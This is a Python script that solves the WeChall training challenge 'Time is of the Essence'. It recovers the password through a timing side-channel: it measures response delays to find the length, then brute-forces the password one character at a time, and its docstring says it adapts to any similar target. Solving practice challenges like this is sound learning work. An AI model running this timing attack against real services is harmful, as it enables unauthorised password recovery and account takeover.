#!/usr/bin/env python3
"""Timing attack on WeChall Training: Time is of the Essence
Adaptable to any challenge with character-by-character comparison delays."""
import requests, time, string, re, sys

COOKIE = 'WC=YOUR_COOKIE_HERE'
URL = 'https://www.wechall.net/en/challenge/training/timing1/index.php'
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits

S = requests.Session()
S.cookies.set('WC', COOKIE)
S.headers['User-Agent'] = 'Mozilla/5.0 Chrome/131'

def get_csrf():
    r = S.get(URL)
    m = re.search(r'name="gwf3_csrf"[^>]*value="([^"]*)"', r.text)
    return m.group(1) if m else None

def try_pw(pw):
    csrf = get_csrf()
    start = time.time()
    S.post(URL, data={'answer': pw, 'solve': 'Submit', 'gwf3_csrf': csrf})
    return time.time() - start

# Check if already solved
r = S.get(URL)
if 'wc_chall_solved_1' in r.text:
    print("Already solved!")
    sys.exit(0)

# Step 1: Find password length
print("Finding password length...")
length_times = {}
for l in range(1, 25):
    t = try_pw('a' * l)
    length_times[l] = t
    marker = ' <--' if t > 0.08 else ''
    print(f"  len={l:2d}: {t*1000:6.1f}ms{marker}")

best_len = max(length_times, key=length_times.get)
print(f"Best length: {best_len} ({length_times[best_len]*1000:.0f}ms)")

# Step 2: Crack character by character
print(f"Cracking {best_len}-char password...")
password = ''
for pos in range(best_len):
    char_times = {}
    for ch in CHARSET:
        test = password + ch + 'a' * (best_len - pos - 1)
        t = try_pw(test)
        char_times[ch] = t
    best_ch = max(char_times, key=char_times.get)
    password += best_ch
    print(f"  pos={pos}: '{best_ch}' ({char_times[best_ch]*1000:.0f}ms) -> '{password}'")

print(f"\nPassword: {password}")

# Step 3: Submit
csrf = get_csrf()
r = S.post(URL, data={'answer': password, 'solve': 'Submit', 'gwf3_csrf': csrf})
if 'correct' in r.text.lower() or 'wc_chall_solved_1' in r.text:
    print("SOLVED!")
else:
    print(f"Response: {r.text[:300]}")
